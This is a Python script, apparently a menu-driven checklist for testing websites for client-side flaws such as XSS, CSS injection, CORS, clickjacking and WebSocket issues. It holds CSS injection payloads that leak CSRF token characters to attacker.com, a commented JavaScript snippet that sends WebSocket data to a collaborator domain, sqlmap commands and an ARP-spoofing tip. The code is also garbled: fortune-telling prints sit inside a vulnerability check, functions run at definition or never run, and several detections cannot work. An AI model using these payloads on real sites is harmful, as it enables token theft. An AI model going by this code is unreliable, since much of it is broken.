import json
import requests
from bs4 import BeautifulSoup
import concurrent.futures
import re
import sys
import http.server,socketserver,json,websocket
import websocket,json
import sqlite3
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager


# Target URL

target_url = 'https://stackoverflow.com/questions/75095107/importerror-cannot-import-name-filters-from-telegram-ext'

def testing_for_DOM_Based_Cross_Site_Scripting():
    print("testing_for_DOM_Based_Cross_Site_Scripting...")
    #Testing alert 
    # Target URL with a DOB parameter
    target_url = 'http://www.example.com/profile?dob='

    payload= '<script>alert("XSS")</script>'
    full_url=target_url+payload

    # Send a GET request to the target URL
    response = requests.get(full_url)

    # Parse the HTML content of the response
    soup = BeautifulSoup(response.content, 'html.parser')

    # Check if the alert box is present in the response
    alert_box = soup.find('body', {'onload': True})
    if alert_box:
        print("Potential XSS vulnerability detected.")
    else:
        print("No potential XSS vulnerability detected.")

def vul_functions():
    # List of JavaScript functions and properties to check for
    vulnerability_functions = [
        "document.write",
        "window.location",
        "document.cookie",
        "eval",
        "document.domain",
        "WebSocket",
        "element.src",
        "postMessage",
        "setRequestHeader",
        "FileReader.readAsText",
        "executeScript",
        "sessionStorage.setItem",
        "document.evaluate",
        "JSON.parse",
        "element.setAttribute",

    ]

    # Send a GET request to the target URL
    response = requests.get(target_url)

    # Parse the HTML content of the response
    if response.status_code == 200:
        soup = BeautifulSoup(response.content, 'html.parser')
        # Check each function and property in the HTML content

        for func in vulnerability_functions:
            result = soup.body(text=lambda t: t and func in t)
            if result:
                print(f"Potential vulnerability found: {func} exists in the HTML content.")
                match func:

                    case "JSON.parse":

                        print( "ayou will have a new house")

                    case 2:

                        print( "you will receive good news ")

                    case 3:

                        print( "you will get a car")

                    case 4:

                        print( "you might face your fear this week")

                    case 5:

                        print( "you will get a pet")
            else:
                print(f"No potential vulnerability found for: {func}")

    print(f"Failed to retrieve the webpage. Status code: {response.status_code}")
    print("Check completed.")


############################################################
    # Testing document.write() sink
    def test_document_write_sink():
        payload = "<script>alert('XSS')</script>"
        #document.write(user_input)
        print(f"Testing document.write() sink with input: {payload}")

############################################################
    # Testing windows.location sink
    def test_windows_location_sink():
        payload = "/redirect"
        # windows.location = user_input
        print(f"Testing windows.location sink with input: {payload}")



############################################################

    # Testing document.cookie sink
    def test_document_cookie_sink():
        payload = "session_id=123456; path=/"
        #document.cookie = user_input
        print(f"Testing document.cookie sink with input: {payload}")


############################################################

    # Testing eval() sink
    def test_eval_sink():
        payload= "alert('XSS')"
        #eval(user_input)
        print(f"Testing eval() sink with input: {payload}")


############################################################

    # Testing document.domain sink
    def test_document_domain_sink():
        payload = "example.com"
        #document.domain = user_input
        print(f"Testing document.domain sink with input: {payload}")

############################################################

    # Testing websocket() sink
    def test_websocket_sink():
        payload = "ws://example.com/ws"
        #websocket = WebSocket(user_input)
        print(f"Testing websocket() sink with input: {payload}")




############################################################

    # Testing element.src sink
    def test_element_src_sink():
        payload = "http://example.com/image.png"
        #img = document.createElement("img")
        #img.src = user_input
        print(f"Testing element.src sink with input: {payload}")




############################################################

    # Testing postmessage() sink
    def test_postmessage_sink():
        payload = "http://example.com"
        message = "Hello, world!"
        #window.postMessage(message, user_input)
        print(f"Testing postmessage() sink with input: {payload} and message: {message}")




############################################################

    # Testing setRequestHeader() sink
    def test_setrequestheader_sink():
        payload = "X-Custom-Header: value"
        #xhr = XMLHttpRequest()
        #xhr.open("GET", "http://example.com/", True)
        #xhr.setRequestHeader(user_input)
        print(f"Testing setRequestHeader() sink with input: {payload}")




############################################################

    # Testing FileReader.readAsText() sink
    def test_filereader_sink():
        payload = "file:///etc/passwd"
        #file_reader = FileReader()
        #file_reader.onload = lambda e: print(e.target.result)
        #file_reader.readAsText(user_input)
        print(f"Testing FileReader.readAsText() sink with input: {payload}")




############################################################

    # Testing ExecuteSl() sink
    def test_executesl_sink():
        payload = "alert('XSS')"
        #ExecuteSl(user_input)
        print(f"Testing ExecuteSl() sink with input: {payload}")



############################################################

    # Testing sessionStorage.setItem() sink
    def test_sessionstorage_sink():
        payload = "session_id=123456"
        #sessionStorage.setItem(user_input)
        print(f"Testing sessionStorage.setItem() sink with input: {payload}")




############################################################

    # Testing document.evaluate() sink
    def test_document_evaluate_sink():
        payload = "//script"
        #doc = document.evaluate(user_input, document, None, XPathResult.ANY_TYPE, None)
        #print(doc)
        print(f"Testing document.evaluate() sink with input: {payload}")



############################################################

    # Testing JSON.parse() sink
    def test_json_parse_sink():
        payload = '{"username": "admin", "password": "password"}'
        #json_data = JSON.parse(user_input)
        #print(json_data)
        print(f"Testing JSON.parse() sink with input: {payload}")




############################################################

    # Testing element.setAttribute() sink
    def test_element_setattribute_sink():
        payload = "style='background-color: red'"
        #element = document.createElement("div")
        #element.setAttribute("style", user_input)
        print(f"Testing element.setAttribute() sink with input: {payload}")


    # Run the tests
    test_document_write_sink()
    test_windows_location_sink()
    test_document_cookie_sink()
    test_eval_sink()
    test_document_domain_sink()
    test_websocket_sink()
    test_element_src_sink()
    test_postmessage_sink()
    test_setrequestheader_sink()
    test_filereader_sink()
    test_executesl_sink()
    test_sessionstorage_sink()
    test_document_evaluate_sink()
    test_json_parse_sink()
    test_element_setattribute_sink()

    ##############################testing_for_JavaScript_Execution#############################

def testing_for_JavaScript_Execution(target_url):
    print("testing_for_JavaScript_Execution...")
    # Target URL with a parameter that accepts JavaScript injection
    url = target_url+'<script>alert("JavaScript Execution Detected");</script>'

    # Send a GET request to the target URL with the JavaScript payload
    response = requests.get(url)

    # Check if the request was successful
    if response.status_code == 200:
        # Parse the HTML content of the response
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Check for signs of JavaScript execution in the response
        # This is a simplistic check; real-world scenarios might require more sophisticated analysis
        if '<script>' in response.text:
            print("Potential JavaScript execution vulnerability detected.")
        else:
            print("No potential JavaScript execution vulnerability detected.")
    else:
        print(f"Failed to retrieve the webpage. Status code: {response.status_code}")



    #############################testing_for_HTML_Injection##############################

def testing_for_HTML_Injection(target_url):

    print("Testing for HTML Injection...")

    # Send a GET request to the URL
    response = requests.get(target_url)

    # Check if the request was successful
    if response.status_code == 200:
        # Parse the HTML content using BeautifulSoup
        soup = BeautifulSoup(response.content, 'html.parser')

        # Check if any of the functions or attributes exist in the parsed HTML
        functions = [
            'innerHTML',
            'outerHTML',
            'document.write()',
            'createElement()',
            'createTextNode()',
            'insertAdjacentHTML()',
            'setAttribute()',
            'eval()'
        ]
        
        for function in functions:
            if soup.find('script', text=lambda text: text and function in text):
                print(f'{function} found')
    else:
        print(f"Failed to retrieve the webpage. Status code: {response.status_code}")



############################testing_for_Client_side_URL_Redirect###############################
# Target URL
target_url = 'https://stackoverflow.com/questions/75095107/importerror-cannot-import-name-filters-from-telegram-ext'

def testing_for_Client_side_URL_Redirect(target_url):
    print("testing_for_Client_side_URL_Redirect...")
    url = target_url
    # Send a GET request to the URL
    response = requests.get(url)

    # Check if the response redirected
    if response.is_redirect:
        # Get the Location header from the response
        location = response.headers.get('location')

        # Check if the Location header contains any dangerous functions
        if 'javascript' in location or 'window.location' in location:
            print(f"URL Redirect Vulnerability found at {url}")
            print(f"Redirecting to: {location}")
        else:
            print(f"URL Redirect Vulnerability not found at {url}")
    else:
        print(f"URL Redirect Vulnerability not found at {url}")


    ##############################testing_for_CSS_Injection#############################

def testing_for_CSS_Injection():
    print("testing_for_CSS_Injection...")
 

    class CSSInjectionTester:
        """
        Test a URL for CSS injection vulnerabilities.
        """

        def __init__(self, url, payloads):
            """
            Initialize the tester with a URL and payloads.

            :param url: The URL to test
            :param payloads: A list of payloads to test
            """
            self.url = url
            self.payloads = payloads
            self.headers = {'User-Agent': 'Mozilla/5.0'}

        def test_payload(self, payload):
            """
            Test a single payload.

            :param payload: The payload to test
            :return: A tuple containing the payload type and vulnerability status
            """
            try:
                if ':' in payload:
                    key, value = payload.split(':', 1)
                    params = {key: value}
                else:
                    params = {}

                response = requests.get(self.url, headers=self.headers, params=params)

                payload_type = self.get_payload_type(payload)
                is_vulnerable = self.check_vulnerability(response, payload_type, payload)

                return payload_type, is_vulnerable
            except Exception as e:
                print(f"Error testing payload '{payload}': {e}")
                return None, False

        def get_payload_type(self, payload):
            """
            Get the type of the payload.

            :param payload: The payload to analyze
            :return: The payload type (e.g., '@font-face', 'background-image', etc.)
            """
            # Example of using regex for more accurate payload type detection
            for payload_type in ['@font-face', 'background-image', ':empty', 'leak']:
                if re.search(payload_type, payload):
                    return payload_type
            return None

        def check_vulnerability(self, response, payload_type, payload):
            """
            Check if the payload is vulnerable.

            :param response: The response from the server
            :param payload_type: The type of the payload
            :param payload: The payload to check
            :return: True if vulnerable, False otherwise
            """
            # Example of enhanced vulnerability detection
            if payload_type == '@font-face':
                return 'font-face' in response.text
            elif payload_type == 'background-image':
                return 'background-image' in response.text
            elif payload_type == ':empty':
                return 'background-image' in response.text
            elif payload_type == 'leak':
                return 'font-face' in response.text
            return False

        def run_tests(self):
            """
            Run all tests in parallel and print the results.
            """
            with concurrent.futures.ThreadPoolExecutor() as executor:
                futures = {executor.submit(self.test_payload, payload): payload for payload in self.payloads}
                for future in concurrent.futures.as_completed(futures):
                    payload = futures[future]
                    try:
                        payload_type, is_vulnerable = future.result()
                        if is_vulnerable:
                            print(f"Vulnerable to {payload_type} injection: {self.url}")
                        else:
                            print(f"Not vulnerable to {payload_type} injection: {self.url}")
                    except Exception as exc:
                        print(f'{payload} generated an exception: {exc}')

    # Example usage
    payloads = [
        "@font-face{ font-family: poc; src: url(http://attacker.com/?leak); unicode-range:U+0041; }",
        "input[name=csrf][value^=a] * { background-image: url(https://attacker.com/exfil/a); }",
        "input[name=csrf][value^=b] * { background-image: url(https://attacker.com/exfil/b); }",
        "[role^=\"img\"][aria-label=\"1\"]:empty { background-image: url(https://attacker.com/exfil/1); }",
        "@font-face{ font-family:poc; src: url(http://attacker.example.com/?A); unicode-range:U+0041; }",
        "@font-face{ font-family:poc; src: url(http://attacker.example.com/?B); unicode-range:U+0042; }",
        "@font-face{ font-family:poc; src: url(http://attacker.example.com/?C); unicode-range:U+0043; }",
        "#sensitive-information{ font-family:poc; }",
        "@font-face{ font-family: poc; src: url(http://attacker.com/?leak); unicode-range:U+0041; }"
    ]

    tester = CSSInjectionTester("https://example.com", payloads)
    tester.run_tests()


    ############################testing_for_Client_side_Resource_Manipulation###############################

def testing_for_Client_side_Resource_Manipulation(html_content):
    print("testing_for_Client_side_Resource_Manipulation...")
    # Define the regular expressions for each injection point
    regexes = [
        r'<iframe\s+[^>]*src=["\']?([^"\']*)["\']?',
        r'<a\s+[^>]*href=["\']?([^"\']*)["\']?',
        r'xhr\.open\(method, (\[url\])',
        r'<link\s+[^>]*href=["\']?([^"\']*)["\']?',
        r'<img\s+[^>]*src=["\']?([^"\']*)["\']?',
        r'<object\s+[^>]*data=["\']?([^"\']*)["\']?',
        r'<script\s+[^>]*src=["\']?([^"\']*)["\']?'
    ]

    # Find the injection points in the HTML content
    injections = []
    for regex in regexes:
        matches = re.findall(regex, html_content, re.IGNORECASE)
        injections.extend(matches)

    # Remove duplicates and empty strings
    injections = list(set(injections))
    injections = [x for x in injections if x]

    # Print the injection points
    if injections:
        print("The following injection points were found:")
        for injection in injections:
            print(f"- {injection}")
    else:
        print("No injection points were found.")

# Read the HTML content from a file or a string
if len(sys.argv) > 1:
    with open(sys.argv[1], 'r') as f:
        html_content = f.read()
else:
    html_content = """
    <html>
    <body>
    <iframe src="https://example.com"></iframe>
    <a href="https://example.com">Link</a>
    <script src="https://example.com/script.js"></script>
    </body>
    </html>
    """

# Check the injection points
testing_for_Client_side_Resource_Manipulation(html_content)

    ###########################testing_Cross_Origin_Resource_Sharing################################

def testing_Cross_Origin_Resource_Sharing(target_url):
    print("testing_Cross_Origin_Resource_Sharing...")

    headers = {
        'Origin': 'http://example.com',
        'Accept-Control-Request-Method': 'GET'
    }

    options_request = requests.options(target_url, headers=headers, allow_redirects=False)

    if options_request.status_code == 200:
        cors_headers = options_request.headers

        if 'access-control-allow-origin' in cors_headers:
            origin = cors_headers['access-control-allow-origin']
            if origin == '*' or origin == headers['Origin']:
                print(f"[+] CORS is enabled for {target_url} with Origin: {origin}")

                if 'access-control-allow-credentials' in cors_headers:
                    if cors_headers['access-control-allow-credentials'] == 'true':
                        print(f"[+] CORS allows credentials for {target_url}")
                    else:
                        print(f"[-] CORS does not allow credentials for {target_url}")
                else:
                    print(f"[-] CORS does not specify credentials for {target_url}")

                if 'access-control-allow-headers' in cors_headers:
                    print(f"[+] CORS allows headers for {target_url}: {cors_headers['access-control-allow-headers']}")
                else:
                    print(f"[-] CORS does not specify allowed headers for {target_url}")

                if 'access-control-allow-methods' in cors_headers:
                    print(f"[+] CORS allows methods for {target_url}: {cors_headers['access-control-allow-methods']}")
                else:
                    print(f"[-] CORS does not specify allowed methods for {target_url}")

            else:
                print(f"[-] CORS does not allow Origin: {origin} for {target_url}")
        else:
            print(f"[-] CORS is not enabled for {target_url}")
    else:
        print(f"[-] Failed to get CORS options for {target_url}")



    #############################testing_for_Cross_Site_Flashing##############################

def testing_for_Cross_Site_Flashing():
    print("testing_for_Cross_Site_Flashing...")
    def test_xsf(url, payload):
        """
        Test for Cross-Site Flashing vulnerability in a Flash application.

        Args:
            url (str): The URL of the web application that contains the Flash object.
            payload (str): The XSF payload to test.

        Returns:
            bool: True if the Flash application is vulnerable to XSF, False otherwise.
        """
        # Construct the URL with the payload
        test_url = f"{url}?param={payload}"

        # Send a GET request to the test URL
        response = requests.get(test_url)

        # Check if the payload is reflected in the response
        if payload in response.text:
            print(f"The Flash application is vulnerable to XSF!")
            return True

        print("The Flash application is not vulnerable to XSF.")
        return False

    # Example usage
    url = "http://example.com/flash_application.html"
    payload = "<script>alert('XSF exploit!')</script>"
    test_xsf(url, payload)

    def test_open_redirector(url, flash_var_name, redirect_url):
        """
        Test for Open Redirector vulnerability in a Flash application.

        Args:
            url (str): The URL of the web application that contains the Flash object.
            flash_var_name (str): The name of the FlashVar to test.
            redirect_url (str): The URL to redirect to.

        Returns:
            bool: True if the Flash application is vulnerable to Open Redirector, False otherwise.
        """
        # Construct the URL with the FlashVar
        test_url = f"{url}?{flash_var_name}={redirect_url}"

        # Send a GET request to the test URL
        response = requests.get(test_url)

        # Check if the response redirects to the expected URL
        if response.url == redirect_url:
            print(f"The Flash application is vulnerable to Open Redirector!")
            return True

        print("The Flash application is not vulnerable to Open Redirector.")
        return False

    # Example usage
    url = "http://example.com/flash_application.html"
    flash_var_name = "getURLValue"
    redirect_url = "http://www.evil-spoofing-website.org/phishEndUsers.html"
    test_open_redirector(url, flash_var_name, redirect_url)

    unsafe_methods = [
        "loadVariables()",
        "loadMovie()",
        "getURL()",
        "loadMovieNum()",
        "FScrollPane.loadScrollContent()",
        "LoadVars.load",
        "LoadVars.send",
        "XML.load( 'url' )",
        "LoadVars.load( 'url' )",
        "Sound.loadSound( 'url' , isStreaming )",
        "NetStream.play( 'url' )",
        "flash.external.ExternalInterface.call(_root.callback)",
        "htmlText"
    ]

    def check_unsafe_methods(actionscript_code):
        """
        Check for unsafe methods in ActionScript code.

        Args:
            actionscript_code (str): The ActionScript code to check.

        Returns:
            bool: True if any unsafe methods are found, False otherwise.
        """
        for method in unsafe_methods:
            if method in actionscript_code:
                print(f"Unsafe method '{method}' found in code.")
                return True
        return False

    # Example usage
    actionscript_code = """
    function someFunction():
        loadVariables("http://example.com/data.txt");
        getURL("http://example.com");
        htmlText = "Hello, world!";
    """
    result = check_unsafe_methods(actionscript_code)
    print("Unsafe methods found:", result)

    #############################testing_for_Clickjacking##############################

def testing_for_Clickjacking(url):
    print("testing_for_Clickjacking...")
    url = input('Enter the URL to test for Clickjacking vulnerability: ')

    headers = {
        'X-Frame-Options': 'SAMEORIGIN',
        'Content-Type': 'text/html; charset=utf-8',
    }
    response = requests.get(url, headers=headers, allow_redirects=False)

    if response.status_code == 200 and 'X-Frame-Options' not in response.headers:
                print(f'The URL {url} is vulnerable to Clickjacking.')

    else:
                print(f'The URL {url} is not vulnerable to Clickjacking.')

    ##############################testing_WebSockets#############################

def testing_WebSockets():
    print("testing_WebSockets...")
    def Identify_WebSocket_Usage():
        import re

def is_using_websocket(client_side_source_code):
    websocket_uri_scheme = r"ws://|wss://"
    if re.search(websocket_uri_scheme, client_side_source_code):
        print("The application is using WebSockets.")
    else:
        print("The application is not using WebSockets.")
    # connects to a WebSocket 
    #     import websocket,json

    # ws = websocket.WebSocket()
    # ws.connect("ws://10.0.0.1/")
    # d = {"message": "hello"}
    # data = str(json.dumps(d))
    # ws.send(data)
    # result = ws.recv()
    # print(json.loads(result))
    # d = {"message": "<script>alert(1)</script>"}

    class CustomHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            payload = self.path.split('=')[1]
            ws = websocket.WebSocket()
            try:
                ws.connect("ws://example.com/")  # Replace with a valid WebSocket server URL
                d = {"message": payload}
                data = json.dumps(d).encode('utf-8')
                ws.send(data)
                result = ws.recv()
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(result)
            except Exception as e:
                print(f"WebSocket error: {e}")
            finally:
                ws.close()

    httpd = socketserver.TCPServer(("", 8081), CustomHandler)
    httpd.serve_forever()

    print("then run sqlmap")
    # sqlmap -u "http://localhost:8081/?id=*" --batch --dbs
    # sqlmap -u "http://localhost:8081/?id=*" --batch --dbs --risk 3 --level 5
    def Input_Validation():

        ws = websocket.WebSocket()
        ws.connect("ws://10.0.0.1/")
        d = {"message": "<script>alert(1)</script>"}
        data = str(json.dumps(d))
        ws.send(data)
        result = ws.recv()
        print(json.loads(result))
    def Authe_Autho_Risks():
        pass
        # <script>
        # websocket = new WebSocket('wss://your-websocket-URL')
        # websocket.onopen = start
        # websocket.onmessage = handleReply
        # function start(event) {
        # websocket.send("READY"); //Send the message to retreive confidential information
        # }
        # function handleReply(event) {
        # //Exfiltrate the confidential information to attackers server
        # fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
        # }
        # </script>
    def Cross_Origin():
        ws = websocket.WebSocket()
        ws.connect("ws://10.0.0.1/")
        ws.send("Hello, World!")
        result = ws.recv()
        print(result)
        #MitM websocket connections: 
        #If you find that clients are connected to a HTTP 
        #websocket from your current local network, 
        #you could try an ARP Spoofing Attack to perform a 
        #MitM attack between the client and the server. 
        #Once the client is trying to connect to you can then 
        #use websocat to connect to the WebSocket server
        #websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v


    ##############################testing_Web_Messaging#############################

def testing_Web_Messaging(url, message):
    print("testing_Web_Messaging...")
    # Send the message to the target URL
    headers = {
        'Content-Type': 'application/json'
    }
    data = json.dumps({'message': message})
    response = requests.post(url, headers=headers, data=data)

    # Check for security risks
    if response.status_code != 200:
        print(f"[!] Response status code: {response.status_code}")
        return None

    if 'X-Content-Type-Options' not in response.headers:
        print("[!] X-Content-Type-Options header not set")

    if 'Content-Security-Policy' not in response.headers:
        print("[!] Content-Security-Policy header not set")

    if 'X-Frame-Options' not in response.headers:
        print("[!] X-Frame-Options header not set")

    if 'X-XSS-Protection' not in response.headers:
        print("[!] X-XSS-Protection header not set")

    # Return the response
    return response.json()

# Test the web messaging vulnerability
url = "https://example.com/receive_message"
message = "Hello, world!"
response = testing_Web_Messaging(url, message)
print(f"Response: {response}")



    ############################testing_Browser_Storage##############################

def testing_Browser_Storage(driver):
    print("testing_Browser_Storage...")
    def list_local_storage(driver):
        # """List all key-value entries in Local Storage."""
        print("Local Storage:")
        local_storage = driver.execute_script('return window.localStorage')
        for key in local_storage.keys():
            print(f"{key}: {local_storage[key]}")

    def list_session_storage(driver):
        """List all key-value entries in Session Storage."""
        print("Session Storage:")
        session_storage = driver.execute_script('return window.sessionStorage')
        for key in session_storage.keys():
            print(f"{key}: {session_storage[key]}")

    def print_indexeddb(driver):
        """Print all the contents of IndexedDB."""
        indexeddb_data = {}
        request = driver.execute_script('''
            var openRequest = indexedDB.open("my_database");
            openRequest.onupgradeneeded = function(event) {
                event.target.result.createObjectStore("my_store");
            };
            openRequest.onsuccess = function(event) {
                var transaction = event.target.result.transaction("my_store", "readonly");
                var objectStore = transaction.objectStore("my_store");
                var getAllRequest = objectStore.getAll();
                getAllRequest.onsuccess = function(event) {
                    indexeddb_data["my_store"] = event.target.result;
                };
            };
        ''')
        return indexeddb_data

    def print_websql(driver):
        """Print all data from Web SQL (deprecated)."""
        conn = sqlite3.connect(":memory:")
        conn.execute("CREATE TABLE my_table (id INTEGER PRIMARY KEY, name TEXT)")
        conn.execute("INSERT INTO my_table (name) VALUES ('Alice')")
        conn.execute("INSERT INTO my_table (name) VALUES ('Bob')")
        cursor = conn.execute("SELECT * FROM my_table")
        print("Web SQL:")
        for row in cursor:
            print(row)

    def list_cookies(driver):
        """List all cookies."""
        response = requests.get("http://www.example.com")
        print("Cookies:")
        for cookie in response.cookies:
            print(f"{cookie.name}: {cookie.value}")

    def main():
        # Setup Selenium WebDriver
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service)

        try:
            # Navigate to a webpage
            driver.get('http://www.example.com')

            print("Today is Tuesday, May 14, 2024")
            print("Local Storage:")
            list_local_storage(driver)
            print("Session Storage:")
            list_session_storage(driver)
            print("IndexedDB:")
            indexeddb_data = print_indexeddb(driver)
            for store_name, store_data in indexeddb_data.items():
                print(f"{store_name}:")
                for item in store_data:
                    print(item)
            print("Web SQL (deprecated):")
            print_websql(driver)
            print("Cookies:")
            list_cookies(driver)
        finally:
            # Close the browser
            driver.quit()



###########################testing_for_Cross_Site_Script_Inclusion################################
def testing_for_Cross_Site_Script_Inclusion():
    print("testing_for_Cross_Site_Script_Inclusion...")

process_steps = {
    '1': testing_for_DOM_Based_Cross_Site_Scripting,
    '2': testing_for_JavaScript_Execution,
    '3': testing_for_HTML_Injection,
    '4': testing_for_Client_side_URL_Redirect(target_url),
    '5': testing_for_CSS_Injection,
    '6': testing_for_Client_side_Resource_Manipulation,
    '7': testing_Cross_Origin_Resource_Sharing(target_url),
    '8': testing_for_Cross_Site_Flashing,
    '9': testing_for_Clickjacking,
    '10': testing_WebSockets,
    '11': testing_Web_Messaging(url, message),
    '12': testing_Browser_Storage,
    '13': testing_for_Cross_Site_Script_Inclusion,
}

while True:
    print("\nClient Side checklist:")
    print("1. Testing for DOM-Based Cross Site Scripting")
    print("2. Testing for JavaScript Execution")
    print("3. Testing for HTML Injection")
    print("4. Testing for Client-side URL Redirect")
    print("5. Testing for CSS Injection")
    print("6. Testing for Client-side Resource Manipulation")
    print("7. Testing Cross Origin Resource Sharing")
    print("8. Testing for Cross Site Flashing")
    print("9. Testing for Clickjacking")
    print("10. Testing WebSockets")
    print("11. Testing Web Messaging")
    print("12. Testing Browser Storage")
    print("13. Testing for Cross Site Script Inclusion")
    print("E. Exit")

    option = input("Enter an option: ").strip()

    if option == 'E' or option == 'e':
        break

    if option in process_steps:
        print(process_steps[option].__name__)
        process_steps[option]()
    else:
        print("Invalid option. Please try again.")